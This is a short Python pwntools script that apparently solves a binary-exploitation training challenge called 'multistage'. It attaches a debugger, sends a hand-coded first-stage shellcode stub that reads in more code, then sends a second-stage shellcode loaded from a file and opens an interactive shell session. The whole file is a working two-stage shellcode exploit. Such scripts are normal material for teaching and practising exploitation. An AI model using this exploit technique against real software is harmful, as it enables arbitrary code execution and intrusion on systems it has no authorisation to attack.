from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

with open("/home/superuser/challenges/tools/shellcodes/normal.sc") as f:
   shellcode = bytes.fromhex(f.readline().strip('\n'))
#print(shellcode.hex())
#r = remote("bin.training.offdef.it", 2003)

r = process("./multistage")
gdb.attach(r, """
b *0x0040123f
c
""")

input("wait")
r.send(b"\x48\x8D\x70\x13\x48\x31\xC0\x48\x31\xFF\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05")
input("wait")
r.send(shellcode)
r.interactive()

